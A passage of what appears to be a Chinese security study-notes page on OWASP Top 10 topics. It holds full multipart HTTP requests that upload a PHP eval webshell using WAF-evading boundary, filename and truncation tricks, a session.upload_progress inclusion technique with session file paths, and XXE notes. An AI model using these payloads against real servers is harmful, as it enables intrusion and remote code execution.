+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundarymeEzpUTMsmOfjwAA</span><span class="o">--</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>下面这样也是可以正常上传的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundarymeEzpUTMsmOfjwAA</span>
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundarymeEzpUTMsmOfjwAA</span><span class="o">--</span>
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundarymeEzpUTMsmOfjwAA</span><span class="p">;</span><span class="mi">123</span>
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundarymeEzpUTMsmOfjwAA</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;upload_file&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;shell.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">image</span><span class="o">/</span><span class="n">png</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="err">@</span><span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;hack&#39;</span><span class="p">]);</span> <span class="err">?</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundarymeEzpUTMsmOfjwAA</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">上传</span>
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundarymeEzpUTMsmOfjwAA</span><span class="o">--</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>filename重复</strong></p>
+<p>最终上传成功的文件名是shell.php。但是由于解析文件名时,会解析到第一个。正则默认都会匹配到第一个</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;upload_file&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;shell.jpg filename=&#34;</span><span class="n">shell</span><span class="o">.</span><span class="n">jpg</span><span class="s2">&#34;; filename=&#34;</span><span class="n">shell</span><span class="o">.</span><span class="n">jpg</span><span class="s2">&#34;; filename=&#34;</span><span class="n">shell</span><span class="o">.</span><span class="n">jpg</span><span class="s2">&#34;; filename=&#34;</span><span class="n">shell</span><span class="o">.</span><span class="n">jpg</span><span class="s2">&#34;; filename=&#34;</span><span class="n">shell</span><span class="o">.</span><span class="n">jpg</span><span class="s2">&#34;; filename=&#34;</span><span class="n">shell</span><span class="o">.</span><span class="n">php</span><span class="s2">&#34;;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="数据溢出" class="headerLink">
+    <a href="#%e6%95%b0%e6%8d%ae%e6%ba%a2%e5%87%ba" class="header-mark"></a>4.0.42.4.4 <strong>数据溢出</strong></h6><p><strong>name与filename之间插入垃圾数据</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">POST</span> <span class="o">/</span><span class="n">Pass</span><span class="o">-</span><span class="mi">02</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="p">:</span> <span class="n">hackrock</span><span class="o">.</span><span class="n">com</span><span class="p">:</span><span class="mi">813</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">multipart</span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">boundary</span><span class="o">=----</span><span class="n">WebKitFormBoundaryzEHC1GyG8wYOH1rf</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundaryzEHC1GyG8wYOH1rf</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;upload_file&#34;</span><span class="p">;</span> <span class="n">fbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">filename</span><span class="o">=</span><span class="s2">&#34;shell.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">image</span><span class="o">/</span><span class="n">png</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="err">@</span><span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]);</span><span class="err">?</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundaryzEHC1GyG8wYOH1rf</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">上传</span>
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundaryzEHC1GyG8wYOH1rf</span><span class="o">--</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>boundary字符串中加入垃圾数据</strong></p>
+<p>boundray字符串的值可以为任何数据（有一定的长度限制）,当长度达到WAF无法处理时,而Web服务器又能够处理,那么就可以绕过WAF上传文件</p>
+<p><strong>boundray末尾插入垃圾数据</strong></p>
+<p>刚才讲到过boundary末尾可以插入任何数据,那么就可以在boundary字符串末尾加入大量垃圾数据</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">POST</span> <span class="o">/</span><span class="n">Pass</span><span class="o">-</span><span class="mi">01</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="p">:</span> <span class="n">hackrock</span><span class="o">.</span><span class="n">com</span><span class="p">:</span><span class="mi">813</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">multipart</span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">boundary</span><span class="o">=----</span><span class="n">WebKitFormBoundaryzEHC1GyG8wYOH1rf</span><span class="p">,</span><span class="n">bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">592</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundaryzEHC1GyG8wYOH1rf</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;upload_file&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;shell.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">image</span><span class="o">/</span><span class="n">png</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="err">@</span><span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]);</span><span class="err">?</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundaryzEHC1GyG8wYOH1rf</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">上传</span>
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundaryzEHC1GyG8wYOH1rf</span><span class="o">--</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>multipart/form-data与boundary之间插入垃圾数据</strong></p>
+<p>刚才讲到过multipart/form-data与boundary之间可以插入任何数据,那么就可以在multipart/form-data与boundary之间加入大量垃圾数据</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">POST</span> <span class="o">/</span><span class="n">Pass</span><span class="o">-</span><span class="mi">01</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="p">:</span> <span class="n">hackrock</span><span class="o">.</span><span class="n">com</span><span class="p">:</span><span class="mi">813</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">multipart</span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">data</span> <span class="n">bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9boundary</span><span class="o">=----</span><span class="n">WebKitFormBoundaryzEHC1GyG8wYOH1rf</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">319</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundaryzEHC1GyG8wYOH1rf</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;upload_file&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;shell.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">image</span><span class="o">/</span><span class="n">png</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="err">@</span><span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]);</span><span class="err">?</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundaryzEHC1GyG8wYOH1rf</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">上传</span>
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundaryzEHC1GyG8wYOH1rf</span><span class="o">--</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="数据截断" class="headerLink">
+    <a href="#%e6%95%b0%e6%8d%ae%e6%88%aa%e6%96%ad" class="header-mark"></a>4.0.42.4.5 数据截断</h6><p><strong>回车换行截断</strong></p>
+<p>POST请求头的值（不是请求头）是可以换行的,但是中间不得有空行。若WAF匹配文件名到换行截止,则可以绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="k">for</span>
+</span></span><span class="line"><span class="cl"><span class="n">m</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;upload_</span>
+</span></span><span class="line"><span class="cl"><span class="n">file</span><span class="s2">&#34;; fi</span>
+</span></span><span class="line"><span class="cl"><span class="n">le</span>
+</span></span><span class="line"><span class="cl"><span class="n">name</span><span class="o">=</span><span class="s2">&#34;sh</span>
+</span></span><span class="line"><span class="cl"><span class="n">ell</span><span class="o">.</span><span class="n">p</span>
+</span></span><span class="line"><span class="cl"><span class="n">h</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="s2">&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>分号截断</strong></p>
+<p>若WAF匹配文件名到分号截止,则可以绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;upload_file&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;shell.jpg;.php&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>引号截断</strong></p>
+<p>php&lt;5.3 单双引号截断特性</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;upload_file&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;shell.jpg&#39;.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;upload_file&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;shell.jpg&#34;</span><span class="o">.</span><span class="n">php</span><span class="s2">&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>00截断</strong></p>
+<p>在url中%00表示ascll码中的0 ,而ascii中0作为特殊字符保留,所以当url中出现%00时就会认为读取已结束。这里使用[0x00]代替16进制的00字符</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;upload_file&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;shell.php[0x00].jpg&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="8利用sessionupload_progress" class="headerLink">
+    <a href="#8%e5%88%a9%e7%94%a8sessionupload_progress" class="header-mark"></a>4.0.43 8.利用session.upload_progress</h4><h5 id="条件" class="headerLink">
+    <a href="#%e6%9d%a1%e4%bb%b6" class="header-mark"></a>4.0.43.1 条件</h5><p>需要知道session文件的存放位置</p>
+<p>如果<code>session.auto_start=On(默认关闭)</code>则PHP在接收请求的时候会自动初始化Session,不再需要执行session_start()</p>
+<p>php&gt;5.4</p>
+<h5 id="使用方法" class="headerLink">
+    <a href="#%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95" class="header-mark"></a>4.0.43.2 使用方法</h5><p>可以利用<code>session.upload_progress</code>将恶意语句写入session文件,然后包含session文件</p>
+<p>session有一个默认选项<code>session.use_strict_mode</code>默认值为<code>0</code>此时用户是可以自己定义Session ID的,</p>
+<p>比如,我们在Cookie里设置<code>PHPSESSID=TGAO</code>,PHP将会在服务器上创建一个文件:<code>/tmp/sess_TGAO</code>即使此时用户没有初始化Session,PHP也会自动初始化Session 并产生一个键值,这个键值由<code>ini.get(&quot;session.upload_progress.prefix&quot;)+由我们构造的session.upload_progress.name值</code>组成,最后被写入session文件里</p>
+<p>默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后,session文件内容立即清空,此时我们可以利用竞争,在session文件内容清空前进行包含利用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">upload_progress</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="s2">&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</p>
+<p><code>prefix+name</code>将表示为session中的键名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">一般的存放地址</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">php</span><span class="o">/</span><span class="nx">sess_PHPSESSID</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">php</span><span class="o">/</span><span class="nx">sessions</span><span class="o">/</span><span class="nx">sess_PHPSESSID</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">sess_PHPSESSID</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">sessions</span><span class="o">/</span><span class="nx">sess_PHPSESSID</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">php5</span><span class="o">/</span><span class="nx">sess_PHPSESSID</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">php7</span><span class="o">/</span><span class="nx">sess_PHPSESSID</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">php</span><span class="o">/</span><span class="nx">sess_PHPSESSID</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">sess_PHPSESSID</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">sessions</span><span class="o">/</span><span class="nx">sess_PHPSESSED</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="06-xxe" class="headerLink">
+    <a href="#06-xxe" class="header-mark"></a>5 06-XXE</h2><p><strong>XXE xml外部实体注入</strong></p>
+<h4 id="1原理-4" class="headerLink">
+    <a href="#1%e5%8e%9f%e7%90%86-4" class="header-mark"></a>5.0.44 1.原理</h4><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载， 导致可加载恶意外部文件， 造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。 xxe漏洞触发的点往往是可以上传xml文件的位置， 没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
+<h4 id="2防御-1" class="headerLink">
+    <a href="#2%e9%98%b2%e5%be%a1-1" class="header-mark"></a>5.0.45 2.防御</h4><p>1、使用开发语言提供的禁用外部实体的方法。
+2、PHP：libxml_disable_entity_loader(true);
+3、过滤用户提交的XML数据
+4、XML 解析库在调用时严格禁止对外部实体的解析</p>
+<h4 id="3关键词" class="headerLink">
+    <a href="#3%e5%85%b3%e9%94%ae%e8%af%8d" class="header-mark"></a>5.0.46 3.关键词：</h4><!DOCTYPE和<!ENTITY，或者，SYSTEM和PUBLIC
+
+## 07-php命令执行
+
+#### 相关函数
+
+```
+eval()
+
+assert
+
+preg_replace()
+
+create_function()
+
+array_map()
+
+call_user_func()
+
+call_user_func_array()
+
+array_filter()
+```
+
+</div>
+
+        
+
+
+<h2>Related Content</h2>
+<div class="related-container">
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/buuctf_reinforce_wp/">BUUCTF awdp加固题</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/ctfhub--info_leakage/">ctfhub_信息泄露wp</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/ctfshow_deserialize/">ctfshow_deserialize</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/ctfshow_file_include/">ctfshow_file_include</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/ctfshow_file_upload/">ctfshow_file_upload</a>
+            </h2>
+        </div>
+    
+
+</div>
+
+<div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 0001-01-01</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/hvv_owasptop10/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\hvv_owasptop10.md target="_blank" rel="noopener noreferrer">View source</a>
+                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\hvv_owasptop10.md target="_blank" rel="noopener noreferrer">Edit this page</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20hvv_OWASP_TOP10&body=|Field|Value|%0A|-|-|%0A|Title|hvv_OWASP_TOP10|%0A|Url|http://scofield1920.github.io/hvv_owasptop10/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\hvv_owasptop10.md| target="_blank" rel="noopener noreferrer">Report issue</a>
+                    </span></div>
